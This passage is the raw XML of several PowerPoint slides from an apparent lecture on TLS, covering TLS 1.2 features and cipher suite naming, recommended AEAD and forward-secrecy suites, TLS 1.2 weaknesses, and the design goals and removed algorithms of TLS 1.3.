            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>TLS 1.2 (2008)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E7697CB3-AE27-3967-7A10-D7DE9505BAF0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7899114" cy="4639760"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>TLS versions 1.2 is still used in many systems, and still considered safe with proper configurations:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Support for modern hashes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> in the PRF and handshake: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>SHA-256/384</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>, not just MD5/SHA-1.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Support for AEAD cipher suites</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Better key exchange options</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Allows forward secrecy.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Bad TLS 1.2 configuration can allow for deprecated cryptography suites</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="337871935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E2DF6-550D-EFA8-1B36-0C541CB58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1391B-18C1-1145-E916-E1AFD34B8ED3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>TLS 1.2 configurations</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6A8B7B05-A5EE-E06A-B957-B53E6A0CDEE6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7899114" cy="4639760"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>In TLS 1.2, cipher suites are named roughly like:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>TLS_&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" err="1">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>KeyExchange</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>&gt;_&lt;Auth&gt;_WITH_&lt;Cipher&gt;_&lt;Mode&gt;_&lt;Hash&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:highlight>
                <a:srgbClr val="C0C0C0"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:highlight>
                <a:srgbClr val="C0C0C0"/>
              </a:highlight>
              <a:latin typeface="Consolas"/>
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Aptos"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:highlight>
                <a:srgbClr val="C0C0C0"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="299669662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CE28-F843-9ED6-22FA-A2E9BDD57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3D60F-83AE-7AEB-6D6A-988061CF70E0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>TLS 1.2 configurations</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{325D1DC4-EC28-378D-33EC-30FCFAB1A6C9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="9343368" cy="4639760"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>The Good</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> properties: AEAD + PFS:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:highlight>
                <a:srgbClr val="C0C0C0"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:highlight>
                <a:srgbClr val="C0C0C0"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:highlight>
                <a:srgbClr val="C0C0C0"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:highlight>
                <a:srgbClr val="C0C0C0"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:highlight>
                <a:srgbClr val="C0C0C0"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="C0C0C0"/>
                </a:highlight>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:highlight>
                <a:srgbClr val="C0C0C0"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="243975576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5D30-AE10-05CF-8A59-AEDA93AE6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4FBE8-A2AD-2ABD-3C53-211EF6F9AD12}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>TLS 1.2 weaknesses</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C5824FFE-5BD9-1080-BC96-9FADFA726C32}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="9343368" cy="4639760"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Too many moving parts</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buFont typeface="Courier New"/>
              <a:buChar char="o"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Compression, renegotiation, session tickets/IDs, lots of cipher suites, etc. Complexity = bugs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buFont typeface="Courier New"/>
              <a:buChar char="o"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Handshake latency</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buFont typeface="Courier New"/>
              <a:buChar char="o"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>A full TLS 1.2 handshake typically needs </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>2 round trips</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> (client hello → server hello + cert → client key exchange → finish). TLS 1.3 reduces this.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="13427274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2DCE-9A11-066C-5919-FAF556A8A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EBB83-68F4-A624-644A-EB784DC6EEB5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>TLS 1.3 (2018)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0074AC03-D6E5-35D9-BB05-8D2F78DF3045}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7899114" cy="3691691"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>TLS 1.3 is the current standard and brings major security &amp; performance improvements.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Design goals</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Security first</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>: remove weak algorithms and fragile features; enforce forward secrecy.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Simplicity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>: far fewer cipher suites and handshake variants.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Performance</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>: reduce handshake round trips and CPU cost.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="351237060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26485-93CB-2854-B34E-D1AA3D323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6EB16-E6B2-F1E9-A8B1-531A31482222}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>TLS 1.3 fixes</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B96BFF38-04B2-5010-0AF1-D743469CB86F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7899114" cy="4143574"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>No static RSA key exchange</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>No static DH key exchange</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>No CBC mode</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> (no AES-CBC, 3DES, etc.)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>No RC4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>No MD5 or SHA-1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
